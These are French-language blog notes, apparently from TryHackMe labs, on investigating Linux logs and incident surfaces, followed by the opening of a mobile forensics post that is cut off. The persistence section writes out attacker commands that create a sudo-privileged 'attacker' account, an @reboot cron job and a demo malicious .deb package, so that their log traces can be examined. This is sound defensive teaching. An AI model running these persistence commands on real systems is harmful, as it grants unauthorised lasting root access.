[{"content":"Introduction Dans le monde Linux comprendre les logs revient à comprendre comment le système fonctionne. Les logs nous permettent de remonter les historiques d\u0026rsquo;activités, les erreurs et les événements système.\nLes types de logs Kernel : Offrent un accès direct au fonctionnement interne de votre système, donnent des informations au niveau du matériel, des drivers et des erreurs système Utilisateur : enregistrent les interactions entre les utilisateurs, les applications et le système d\u0026rsquo;exploitation, inclus les connexions, les exécution de commandes \u0026hellip; Niveaux de log Niveau Description EMERGENCY Niveau le plus élevé, apparait quand le système est inutilisable ou crash ALERT Fournit des informations là où l\u0026rsquo;attention de l\u0026rsquo;utilisateur est requise immédiatement CRITICAL Fournit des informations sur les erreus critiques ERROR Avertit les utilisateur des erreurs non critique WARNING Affiche les avertissements d\u0026rsquo;erreur non imminentes NOTICE Avertit des événements qui mérite d\u0026rsquo;être examiné INFO Fournit des informations sur les actions et les opérations du système DEBUG Information détaillé pour le débogage Log Kernel Le kernel est le coeur du système, il orchestre les interactions matérielles, la gestion des processus et l\u0026rsquo;allocation des ressources. Ces logs nous offres un accès direct au fonctionnement du système.\nNous pouvons examiner ces logs avec la commande dmesg.\nRepertoire /var/log Ces logs sont indispensables dans une investigation, car il renferme des informations sur les activités, les événements du système, des enregistrements de processus, des activités utilisateurs, des connexions réseaux et bien plus encore.\nKern.log \u0026amp; dmesg Le fichier Kern.log est dédié à l\u0026rsquo;enregistrement des messages du noyau. Il est essentiel pour diagnostiquer les pannes matérielles.\n1 2 3 4 5 6 7 8 9 10 11 12 $ tail -f /var/log/kern.log Jun 27 10:54:13 tryhackme kernel: raid6: sse2x1 gen() 4131 MB/s Jun 27 10:54:13 tryhackme kernel: raid6: sse2x1 xor() 3083 MB/s Jun 27 10:54:13 tryhackme kernel: raid6: using algorithm avx2x1 gen() 9658 MB/s Jun 27 10:54:13 tryhackme kernel: raid6: .... xor() 4742 MB/s, rmw enabled Jun 27 10:54:13 tryhackme kernel: raid6: using avx2x2 recovery algorithm Jun 27 10:54:13 tryhackme kernel: xor: automatically using best checksumming function avx Jun 27 10:54:13 tryhackme kernel: Btrfs loaded, crc32c=crc32c-intel, zoned=yes, fsverity=yes Jun 27 12:11:02 tryhackme kernel: custom_kernel: loading out-of-tree module taints kernel. Jun 27 12:11:02 tryhackme kernel: custom_kernel: module verification failed: signature and/or required key missing - tainting kernel Jun 27 12:11:02 tryhackme kernel: Custom Kernel Module Loaded: Simulating Kernel Exploit Le fichier dmesg est nous permet de détecter des messages inhabituels au démarrage, pouvant nous indiquer une altération ou un problème matériel. Il est très compliquer de suivre efficacement ce format de log\n1 2 3 4 5 6 7 8 9 10 11 $ tail /var/log/dmesg [ 30.719880] kernel: audit: type=1400 audit(1719484416.292:4): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/lib/NetworkManager/nm-dhcp-client.action\u0026#34; pid=352 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.719886] kernel: audit: type=1400 audit(1719484416.292:5): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/lib/NetworkManager/nm-dhcp-helper\u0026#34; pid=352 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.719888] kernel: audit: type=1400 audit(1719484416.292:6): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/lib/connman/scripts/dhclient-script\u0026#34; pid=352 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.719891] kernel: audit: type=1400 audit(1719484416.292:7): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/{,usr/}sbin/dhclient\u0026#34; pid=352 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.829947] kernel: audit: type=1400 audit(1719484416.400:8): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/lib/cups/backend/cups-pdf\u0026#34; pid=360 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.829954] kernel: audit: type=1400 audit(1719484416.400:9): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/sbin/cupsd\u0026#34; pid=360 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.829957] kernel: audit: type=1400 audit(1719484416.400:10): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/sbin/cupsd//third_party\u0026#34; pid=360 comm=\u0026#34;apparmor_parser\u0026#34; [ 30.836788] kernel: audit: type=1400 audit(1719484416.408:11): apparmor=\u0026#34;STATUS\u0026#34; operation=\u0026#34;profile_load\u0026#34; profile=\u0026#34;unconfined\u0026#34; name=\u0026#34;/usr/bin/man\u0026#34; pid=364 comm=\u0026#34;apparmor_parser\u0026#34; [ 49.317142] kernel: EXT4-fs (xvda1): resizing filesystem from 10485499 to 15728379 blocks [ 49.568767] kernel: EXT4-fs (xvda1): resized filesystem to 15728379 Auth.log Comme son nom l\u0026rsquo;indique il permet de regrouper tous les événements liées à une authentification. Quelle soit réussie ou échouée la tentative est enregistré dans ce fichier.\nSimulation d\u0026rsquo;une connexion SSH sur une machine :\n1 2 3 4 5 6 7 $ ssh root@localhost -p 22 The authenticity of host \u0026#39;localhost (127.0.0.1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is ------ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. root@localhost: Permission denied (publickey). Voici le retour dans le fichier auth.log\n1 2 3 4 5 $ tail -f /var/log/auth.log Jun 27 08:55:45 tryhackme sshd[70808]: Connection closed by authenticating user root 127.0.0.1 port 43086 [preauth] Jun 27 08:56:10 tryhackme sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/auth.log Jun 27 08:56:10 tryhackme sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0) Nous pouvons filtrer l\u0026rsquo;output de la commande avec grep :\n1 2 3 $ grep \u0026#39;Accepted password\u0026#39; /var/log/auth.log May 31 11:17:00 server sshd[2009]: Accepted password for root from 192.168.1.50 port 22 ssh2 \u0026lsquo;Accepted password\u0026rsquo; peut être remplacé par \u0026lsquo;sudo\u0026rsquo;, \u0026lsquo;session opened\u0026rsquo; ou autre chose.\nFiltrage par jour/heure :\n1 awk \u0026#39;/2024-06-04 15:30:00/,/2024-06-05 15:29:59/\u0026#39; /var/log/auth.log syslog Ce fichier nous permet de collecter divers messages système, ce qui en fait un point central pour comprendre les événements système. Ce journal capture tout, des exécutions de tâches cron aux activités du noyau, offrant une vue complète de l\u0026rsquo;état et des activités de votre système.\n1 2 3 4 5 6 7 8 9 $ grep \u0026#39;CRON\u0026#39; /var/log/syslog Jun 18 00:09:01 tryhackme CRON[18304]: (root) CMD ( [ -x /usr/lib/php/sessionclean ] \u0026amp;\u0026amp; if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi) Jun 18 00:09:01 tryhackme CRON[18305]: (root) CMD ( test -x /etc/cron.daily/popularity-contest \u0026amp;\u0026amp; /etc/cron.daily/popularity-contest --crond) Jun 18 00:17:01 tryhackme CRON[18358]: (root) CMD ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly) Jun 18 00:39:01 tryhackme CRON[18367]: (root) CMD ( [ -x /usr/lib/php/sessionclean ] \u0026amp;\u0026amp; if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi) Jun 18 01:09:01 tryhackme CRON[18424]: (root) CMD ( [ -x /usr/lib/php/sessionclean ] \u0026amp;\u0026amp; if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi) Jun 18 01:17:01 tryhackme CRON[18476]: (root) CMD ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly) Jun 18 01:39:01 tryhackme CRON[18486]: (root) CMD ( [ -x /usr/lib/php/sessionclean ] \u0026amp;\u0026amp; if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi) btmp \u0026amp; wtmp Le /var/log/btmple fichier enregistre les tentatives de connexion échouées, tandis que le /var/log/wtmpenregistre chaque connexion et déconnexion.\n1 2 3 4 5 6 7 8 $ last -f /var/log/wtmp ubuntu pts/3 10.110.7.185 Thu Jun 27 11:50 - 15:04 (03:13) ubuntu pts/2 10.110.7.185 Thu Jun 27 11:50 - 15:05 (03:15) ubuntu pts/1 10.110.7.185 Thu Jun 27 10:36 - 13:28 (02:52) ubuntu pts/0 10.110.7.185 Thu Jun 27 10:34 - 13:28 (02:53) reboot system boot 5.15.0-1053-aws Thu Jun 27 10:33 still running reboot system boot 5.15.0-1053-aws Sun Jun 23 16:34 still running Log utilisateurs avec syslog Présentation Syslog a évolué avec le temps avec déiférentes versions :\nsyslogd : démon d\u0026rsquo;origine syslog-ng : version amélioré avec d\u0026rsquo;avantages de fonctionnalités basé sur le contenu, le transport TCP \u0026hellip; rsyslog : démon le plus récents avec des performances élevées, prise ne cahrge du TLS, du stockage de BDD et de la modification des messages Syslog se présente sous trois composants principaux :\nLe démon : rsyslog ou syslogd gères la journalisation Fichier de configuration : /etc/rsyslog ou /etc/syslog.conf Fichier de journaux : /var/log Niveaux de gravité des logs Valeur Gravité Mot-clé Description 0 Emergency emerg Le système est inutilisable 1 Alert alert Une action immédiate est nécessaire 2 Critical crit Conditions critiques 3 Error err Conditions critiques 4 Warning warning Conditions d\u0026rsquo;avertissement 5 Notice notice Normal mais significatif 6 Informational info Messages d\u0026rsquo;information 7 Debug debug Messages de niveau de débogage Installations Syslog Code numérique Mot-clé Nom d\u0026rsquo;installation 0 kern Messages du noyau 1 user Messages au niveau de l\u0026rsquo;utilisateur 2 mail Messages au niveau de l\u0026rsquo;utilisateur 3 daemon Démons système 4 auth Messages de sécurité/d\u0026rsquo;authentification 5 syslog Messages syslog internes 6 lpr Sous-système d\u0026rsquo;imprimante en ligne 7 news Sous-système d\u0026rsquo;informations du réseau 8 uucp Sous-système UUCP 9 cron Sous-systèmes Cron 10 authpriv Messages de sécurité 11 ftp FTP démon 12 ntp NTP Sous-système 13 security Audit du journal de sécurité 14 console Alertes du journal de la console 15 solaris-cron Journaux de planification 16-23 local0 to local7 Installations utilisées localement Journalctl Binaire utilisé par les Distributions basés sur systemd. C\u0026rsquo;est un outil très puissant, il fournit des logs structurés et indexés, ce qui permet de \u0026ldquo;personnaliser\u0026rdquo; l\u0026rsquo;output (filtrage spécifique).\nUtilisation de la commande Pour afficher les legs avec journalctl c\u0026rsquo;est simple :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ journalctl -- Logs begin at Wed 2023-09-06 07:57:36 UTC, end at Tue 2024-06-11 08:17:01 UTC. -- Sep 06 07:57:36 ubuntu kernel: Linux version 5.4.0-1029-aws (buildd@lcy01-amd64-022) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #30-Ubuntu SMP Tue Oct 20 10:06:38 UTC 2020 (Ub\u0026gt; Sep 06 07:57:36 ubuntu kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-5.4.0-1029-aws root=PARTUUID=da63a61e-01 ro console=tty1 console=ttyS0 nvme_core.io_timeout=4294967295 panic=-1 Sep 06 07:57:36 ubuntu kernel: KERNEL supported cpus: Sep 06 07:57:36 ubuntu kernel: Intel GenuineIntel Sep 06 07:57:36 ubuntu kernel: AMD AuthenticAMD Sep 06 07:57:36 ubuntu kernel: Hygon HygonGenuine Sep 06 07:57:36 ubuntu kernel: Centaur CentaurHauls Sep 06 07:57:36 ubuntu kernel: zhaoxin Shanghai Sep 06 07:57:36 ubuntu kernel: x86/fpu: Supporting XSAVE feature 0x001: \u0026#39;x87 floating point registers\u0026#39; Sep 06 07:57:36 ubuntu kernel: x86/fpu: Supporting XSAVE feature 0x002: \u0026#39;SSE registers\u0026#39; Sep 06 07:57:36 ubuntu kernel: x86/fpu: Supporting XSAVE feature 0x004: \u0026#39;AVX registers\u0026#39; Sep 06 07:57:36 ubuntu kernel: x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256 Sep 06 07:57:36 ubuntu kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using \u0026#39;standard\u0026#39; format. Voici les arguments possible avec journalctl\nArgument Description Exemple -f Suivez le journal et affichez les nouvelles entrées au fur et à mesure qu\u0026rsquo;elles sont ajoutées. journalctl -f -k Afficher uniquement les messages du noyau. journalctl -k -b Afficher les messages d\u0026rsquo;un démarrage spécifique. journalctl -b -1 -u Filtrer les messages par une unité spécifique. journalctl -u apache.service -p Filtrer les messages par priorité. journalctl -p err -S Afficher les messages depuis une heure spécifique. journalctl -S \u0026quot;2021-05-24 14:08:01\u0026quot; -U Afficher les messages jusqu\u0026rsquo;à une heure précise. journalctl -U \u0026quot;2021-05-24 15:46:01\u0026quot; -r Inversez la sortie, en affichant d\u0026rsquo;abord les entrées les plus récentes. journalctl -r -n Limitez le nombre de lignes affichées. journalctl -n 20 --no-pager Ne dirigez pas la sortie vers un pager. journalctl --no-pager Nous pouvons également, filtré les journaux pour avoir seulement les logs entre telles et telles date :\n1 $ journalctl -S \u0026#34;2024-02-06 15:30:00\u0026#34; -U \u0026#34;2024-02-17 15:29:59\u0026#34; Filtrage par heures :\n1 $ journalctl -S \u0026#34;2 hours ago\u0026#34; Par criticité :\n1 2 3 4 5 6 7 journalctl -p crit -- Logs begin at Sun 2022-02-27 13:52:14 UTC, end at Tue 2024-06-18 08:16:30 UTC. -- Feb 27 15:14:15 ip-10-10-238-44 gnome-session-binary[38253]: CRITICAL: We failed, but the fail whale is dead. Sorry.... -- Reboot -- Jun 11 19:20:37 tryhackme sudo[77760]: pam_unix(sudo:auth): auth could not identify password for [www-data] Jun 11 19:20:37 tryhackme sudo[77760]: www-data : command not allowed ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=list Jun 11 19:33:44 tryhackme sudo[77794]: pam_unix(sudo:auth): auth could not identify password for [www-data] Logs d\u0026rsquo;applications Prenons l\u0026rsquo;exemple de l\u0026rsquo;application apache2. Les logs se trouve dans /var/log/apache2/{access.log,error.log}, elles sont configurées dans /etc/apache2/apache2.conf.\nPour lire les logs nous pouvons utiliser (comme toutes les autres logs) cat, less ou tail.\nNous pouvons également filtrer l\u0026rsquo;output avec grep :\n1 grep \u0026#34;10.109.30.250\u0026#34; /var/log/apache2/access.log* Nous pouvons filtrer avec les codes erreurs (404, 403 etc.).\n","date":"2025-12-09T00:00:00Z","permalink":"http://localhost:1313/p/linux-investigation-des-logs/","title":"Linux - Investigation des Logs"},{"content":"Introduction La surface d\u0026rsquo;incident fait référence aux points d\u0026rsquo;entré du système.\nIl y a une différence entre Surface d\u0026rsquo;Attaque et une Surface d\u0026rsquo;Incident.\nSurface d\u0026rsquo;Attaque :\nPorts ouverts Services de course Exécution de logiciels ou d\u0026rsquo;applications présentant des vulnérabilités Communication réseau Face à la surface d\u0026rsquo;attaque, le but est de la minimiser :\nIdentifier et corriger les vulnérabilités Minimiser l\u0026rsquo;utilisation de services indésirables Vérifiez les interfaces avec lesquelles l\u0026rsquo;utilisateur interagit Minimiser les services, applications, ports, etc. exposés publiquement Surface d\u0026rsquo;Incident désigne elle, tous les domaines de système impliqué dans la détection, la gestion et la réponse à un incident de sécurité.\nExemple de Surface d\u0026rsquo;Incident :\nJournaux système auth.log, syslog, krnl.log, etc Trafic réseau Processus en cours d\u0026rsquo;exécution Services de course L\u0026rsquo;intégrité des fichiers et des processus Comprendre la surface de l’incident est essentiel pour répondre efficacement à une attaque en cours, atténuer les dommages, récupérer les systèmes affectés et appliquer les leçons apprises pour prévenir de futurs incidents.\nProcessus et Communication Réseau Les processus et la communication réseau sont essentiels à tout système d\u0026rsquo;exploitation lors des enquêtes sur les incidents. La surveillance et l\u0026rsquo;analyse des processus, notamment ceux liés à la communication réseau, peuvent contribuer à identifier et à résoudre les incidents de sécurité. Les processus en cours d\u0026rsquo;exécution sont un élément clé de la surface d\u0026rsquo;incident Linux , car ils peuvent constituer une source potentielle de preuves d\u0026rsquo;une attaque.\nAnalyse d\u0026rsquo;un processus simple Pour commencer on compile le processus qui est un simple .c\n1 2 gcc simple.c -o /tmp/simple /tmp/simple Une fois la notre binaire lancé, nous ppouvons ouvrir un nouveau terminal et voir les processus en cours d\u0026rsquo;exécution avec la commande ps aux: a : Affiche les processus pour tout les utilisateurs u : Affiche le format orienté utilisateur (inclut l\u0026rsquo;utilisateur et l\u0026rsquo;heure de début) x : Inclut les processus non attachés à un terminal La sortie de cette commande nous donne ces informations : Shows ps aux output\nLa sortie fournit les informations suivantes :\nUTILISATEUR : L\u0026rsquo;utilisateur qui possède le processus. PID : ID du processus. %CPU : pourcentage d\u0026rsquo;utilisation du processeur. %MEM : Pourcentage d\u0026rsquo;utilisation de la mémoire. VSZ : Taille de la mémoire virtuelle. RSS : Resident Set Size (mémoire actuellement utilisée). TTY : Terminal associé au processus. STAT : État du processus (par exemple, R pour exécution, S pour veille, Z pour zombie). START : Heure de début du processus. COMMANDE : Commande qui a démarré le processus Nous pouvons lier cette commande avec un grep pour avoir un résultat précis. Avec le PID nous pouvons faire une recherche plus appronfondie, comme les ressources qu\u0026rsquo;utilse notre binaire. Nous allons faire ça avec la commande lsof.\n1 lsof -p \u0026lt;PID\u0026gt; Analyse d\u0026rsquo;un processus avec communication réseau Dans la plupart des scénarios, les processus communicant avec un IP externe mérites d\u0026rsquo;être examinés. Pour expliquer comment ça se passe nous allons exécuter un processus appelé netcom.\n1 2 ./netcom ps aux Donc nous voyons bien la ligne concernant notre binaire. Il possède le PID 2130, mais nous allons d\u0026rsquo;abord voir si une connexion vers l\u0026rsquo;extérieur à lieu avec la commande suivante :\n1 lsof -i -P -n lsof : List Open Files, affiche les infos sur les fichiers ouvert par les processus i : affiche les infos sur les connexions réseau, y compris les sockets P : affiche les ports utilisés n : transforme les nom DNS en IP Maintenant que nous savons qu\u0026rsquo;il y a une connexion suspecte, nous allons utiliser l\u0026rsquo;outil osqueryi :\n1 2 sudo osqueryi SELECT pid, fd, socket, local_address, remote_address FROM process_open_sockets WHERE pid = \u0026lt;PID\u0026gt;; Voici quand il est important d\u0026rsquo;investiguer :\nUn processus exécuté à partir d\u0026rsquo;un répertoire tmp (le contexte est important). Un processus parent-enfant suspect. Processus avec une connexion réseau suspecte. Processus orphelin. Tous les processus orphelins ne sont pas suspects, mais ceux qui ne sont associés à aucun processus parent après exécution méritent d\u0026rsquo;être examinés. Processus suspects exécutés via une tâche cron . Processus ou binaires liés au système exécutés à partir du répertoire tmp ou des répertoires utilisateur. Persistance La persistance désigne généralement les techniques utilisées par les adversaires pour maintenir l\u0026rsquo;accès à un système compromis après l\u0026rsquo;exploitation initiale. Pour comprendre comment différents incidents sont identifiés à différents points du poste Linux , nous commencerons par exécuter l\u0026rsquo;attaque, puis examinerons où et comment les empreintes d\u0026rsquo;attaque se reflètent.\nCréation de compte Pour avoir une persistance sur un Endpoint Linux généralement les attaquants créer un utilisateur. Voici les commandes que l\u0026rsquo;attaquant va utiliser :\n1 2 3 sudo useradd attacker -G sudo sudo passwd attacker echo \u0026#34;attacker ALL=(ALL:ALL) ALL\u0026#34; | sudo tee -a /etc/sudoers Pour analyser ces traces, nous allons examiner les logs du système. Pour nous rendre compte des différents logs que nous avons à notre disposition, nous pouvons nous rendre dans : /var/log :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 cd /var/log/ ls -al total 3108 drwxrwxr-x 16 root syslog 4096 Sep 5 00:00 . drwxr-xr-x 14 root root 4096 Feb 27 2022 .. -rw-r--r-- 1 root root 35148 Aug 20 07:34 Xorg.0.log -rw-r--r-- 1 root root 116188 Feb 16 2024 Xorg.0.log.old -rw-r--r-- 1 root root 0 Sep 1 00:00 alternatives.log -rw-r--r-- 1 root root 8021 Aug 22 06:57 alternatives.log.1 -rw-r--r-- 1 root root 3001 Feb 16 2024 alternatives.log.2.gz drwxr--r-x 3 root root 4096 Feb 27 2022 amazon -rw-r----- 1 root adm 0 Aug 20 07:34 apport.log -rw-r----- 1 root adm 398 Feb 16 2024 apport.log.1 drwxr-xr-x 2 root root 4096 Sep 5 06:52 apt -rw-r----- 1 syslog adm 46892 Sep 5 21:30 auth.log -rw-r----- 1 syslog adm 72850 Aug 31 23:30 auth.log.1 ... ... ... Dans ce cas nous pouvons regarder dans le fichier auth.log :\n1 2 3 4 5 6 sudo cat auth.log | grep useradd Sep 5 21:18:19 tryhackme sudo: ubuntu : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/sbin/useradd attacker -G sudo Sep 5 21:18:19 tryhackme useradd[184928]: new group: name=attacker, GID=1001 Sep 5 21:18:19 tryhackme useradd[184928]: new user: name=attacker, UID=1001, GID=1001, home=/home/attacker, shell=/bin/sh, from=/dev/pts/0 Sep 5 21:18:45 tryhackme sudo: ubuntu : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/sbin/useradd attacker -G sudo Dans l\u0026rsquo;output de la commande nous voir la création de l\u0026rsquo;utilisateur en détail.\nLe fichier /etc/passwdpeut également nous intéresser, car nous verrons tout les utilisateurs présent sur la machine :\n1 2 3 4 5 6 7 8 9 10 11 12 13 sudo /etc/passwd kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin lightdm:x:114:121:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:115:123::/nonexistent:/bin/false dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin avahi-autoipd:x:117:124:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:119:125:RealtimeKit,,,:/proc:/usr/sbin/nologin avahi:x:120:126:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin fwupd-refresh:x:130:136:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin attacker:x:1001:1001::/home/attacker:/bin/sh Dans cet output, nous pouvons voir ces détail :\nNom d\u0026rsquo;utilisateur. L\u0026rsquo;espace réservé au mot de passe est représenté par x ou *, indiquant que le mot de passe est stocké dans le fichier /etc/shadow. ID utilisateur attribué à l\u0026rsquo;utilisateur ID de groupe attribué à l\u0026rsquo;utilisateur. Répertoire personnel de l\u0026rsquo;utilisateur. Chemin vers le shell par défaut de l\u0026rsquo;utilisateur. Cron job Cron est un planificateur de tâches basé sur le temps. Il va nous permettre d\u0026rsquo;effectuer des tâches sans que nous intervenons sur le système (commandes, exécution de script \u0026hellip;).\nLa commande crontab -e nous permet d\u0026rsquo;ajouter une tache cron, mais aussi de voir les tâches qui s\u0026rsquo;exécute automatiquement.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 crontab -e # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute (m), hour (h), day of month (dom), month (mon), # and day of week (dow) or use \u0026#39;*\u0026#39; in these fields (for \u0026#39;any\u0026#39;). # # Notice that tasks will be started based on the cron\u0026#39;s system # daemon\u0026#39;s notion of time and timezones. # # Output of the crontab jobs (including errors) is sent through # email to the user the crontab file belongs to (unless redirected). # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab(5) and cron(8) # # m h dom mon dow command @reboot /path/to/malicious/script.sh Ici, à chaque redémarrage, le script script.sh est lancé. Nous pouvons voir quel utilisateur à des tâches cron au chemin suivant : /var/spool/cron/crontabs/.\nServices C\u0026rsquo;est une autre méthode qui permet d\u0026rsquo;assurer la persistance, tout comme la cron task ci dessus, les services vont nous permettent. La tâche s\u0026rsquo;exécutera en arrière plan et à chaque démarrage de la machine.\nPour analyser un service qui nous paraît suspect nous pouvons nous rendre dans /etc/systemd/system/\u0026lt;service qui nous paraît suspect\u0026gt;. Ici le service benign.service est suspect : pas d\u0026rsquo;utilisateur, pas de groupe, lancement dans le /tmp tout paraît suspect.\nFootprint sur le disque Des empreintes sur le système seront présentes, les plus évidente seront :\n/etc/passwd: ce fichier contiendra des informations sur les comptes utilisateurs /etc/shadow: il contiendra les mot de passe hachés des comptes /etc/group: définit les groupes des utilisateurs /etc/sudoers: configure les autorisations sudo Enquête fictive sur un paquet malveillant Création du paquet 1.1) Création des répertoires 1 2 3 mkdir malicious-packages cd malicious-packages mkdir DEBIAN 1.2) Création du fichier de contrôle 1 2 3 4 5 6 7 8 9 nano control Package: malicious-package Version: 1.0 Section: base Priority: optional Architecture: all Maintainer: attacker@test.com Description: This is a malicious Package 1.3) Ajout du script 1 2 3 4 5 6 7 8 nano postint #!/bin/bash # Malicious post-installation script # It will run this script after installation # Print a suspicious message - for demonstration echo \u0026#34;something suspicious\u0026#34; Rendre le script exécutable 1 chmod 755 malicious-package/DEBIAN/postinst Construire le paquet 1 dpkg-deb --build malicious-package Installation du paquet 1 dpkg -i malicious-package.deb Examen des log d\u0026rsquo;installation 1 2 3 4 5 6 7 grep \u0026#34; install \u0026#34; /var/log/dpkg.log 2024-06-13 06:47:05 install linux-image-5.15.0-1063-aws:amd64 \u0026lt;none\u0026gt; 5.15.0-1063.69~20.04.1 2024-06-13 06:47:06 install linux-aws-5.15-headers-5.15.0-1063:all \u0026lt;none\u0026gt; 5.15.0-1063.69~20.04.1 2024-06-13 06:47:09 install linux-headers-5.15.0-1063-aws:amd64 \u0026lt;none\u0026gt; 5.15.0-1063.69~20.04.1 2024-06-24 19:17:39 install osquery:amd64 \u0026lt;none\u0026gt; 5.12.1-1.linux 2024-06-26 05:54:38 install sysstat:amd64 \u0026lt;none\u0026gt; 12.2.0-2ubuntu0.3 2024-06-26 14:32:05 install malicious-package:amd64 \u0026lt;none\u0026gt; 1.0 Logs Linux Syslog :\nEmplacement: /var/log/syslog Ceci est utile pour identifier les événements, erreurs et avertissements à l\u0026rsquo;échelle du système. Cela peut fournir des informations sur les problèmes liés aux composants ou services du système. Il contient des messages système généraux, notamment des messages du noyau, des services système et des journaux d\u0026rsquo;application. Ce fichier journal est utile pour identifier les événements, les erreurs et les avertissements à l’échelle du système. Il peut fournir des informations sur les problèmes liés aux composants ou aux services du système. Messages :\nEmplacement: /var/log/messages Similaire à syslog, ce fichier comprend les messages système et les journaux du noyau. Utile pour diagnostiquer les problèmes du système et suivre l\u0026rsquo;activité du système. La découverte d’entrées inhabituelles liées à des erreurs matérielles ou de noyau peut signaler une tentative de falsification des composants du système. Par exemple, des messages répétés de panique du noyau pourraient indiquer une attaque par déni de service ciblant la stabilité du système. Authentification :\nEmplacement: /var/log/auth.log Ce fichier enregistre les tentatives d\u0026rsquo;authentification, y compris les tentatives de connexion réussies et échouées. Il s\u0026rsquo;agit d\u0026rsquo;un fichier journal important pour détecter les tentatives d\u0026rsquo;accès non autorisées et les attaques par force brute. Par exemple, la détection de plusieurs tentatives de connexion infructueuses à partir d\u0026rsquo;une adresse IP inconnue ou d\u0026rsquo;heures de connexion inhabituelles peut indiquer une attaque par force brute ou une tentative d\u0026rsquo;accès non autorisé. Voici quelques exemples clés d’événements pouvant être classés comme incidents :\nTentatives de connexion échouées. Tentative de connexion réussie mais à un moment inhabituel (après les heures de bureau ou le week-end -\u0026gt; selon le contexte de l\u0026rsquo;entreprise). Communication réseau suspecte. Erreurs système. Création de compte utilisateur sur le serveur sensible. Le trafic sortant est initié à partir du serveur Web. ","date":"2025-12-09T00:00:00Z","permalink":"http://localhost:1313/p/linux-surface-dincident/","title":"Linux - Surface d'Incident"},{"content":"Introduction Pourquoi les appareils mobiles sont des mines d\u0026rsquo;or de données ? Car il contiennent une large gamme de donnée :\nCarnets d\u0026rsquo;appel et de discussion GPS et données de navigation Documents et téléchargements Images et vidéo Historique de navigation Historique WiFi Données spécifiques à l\u0026rsquo;application Forensic Mobile Protection des fabricants Les mobiles modernes possèdent de nombreuses protections de sécurité, comme le chiffrement complet des disques, nécessitant une authentification (Mot de passe, Face ID, Empreinte digital \u0026hellip;).\nMécanisme Explication Chiffrement complet du disque et cryptage des fichiers Sauf si l’appareil est authentifié ou contourné, les outils médico-légaux ne peuvent pas accéder aux données stockées. Les fichiers individuels peuvent également être chiffrés avec des clés distinctes. Clés de chiffrement sécurisées Android et iOS utilisent un composant matériel dédié pour stocker les clés de chiffrement, ce qui les rend extrêmement difficiles à extraire, similaire au module TPM sur les cartes mères. Démarrage sécurisé Assure que seul le code approuvé et signé par le fabricant peut s’exécuter, empêchant toute modification non autorisée. Une ancienne technique d’investigation consistait à utiliser un logiciel de démarrage personnalisé pour contourner certains mécanismes de sécurité. Isolation des applications (Sandboxing) Les applications fonctionnent dans des environnements séparés et isolés les unes des autres. Ce concept sera approfondi dans le reste du module. Effacement automatique après échec d’authentification Les dispositifs peuvent être configurés pour s’effacer après un certain nombre de tentatives d’authentification échouées (ex. PIN incorrects). Cela empêche les attaques par force brute. Effacement à distance Grâce à des fonctionnalités comme « Find My », les appareils peuvent être effacés à distance en cas de vol ou de perte. APT vs Mobile Logiciels espions La découverte de Pegasus, un logiciel malveillant très sophistiqué conçu à des fins de surveillance, ayant souvent accès via 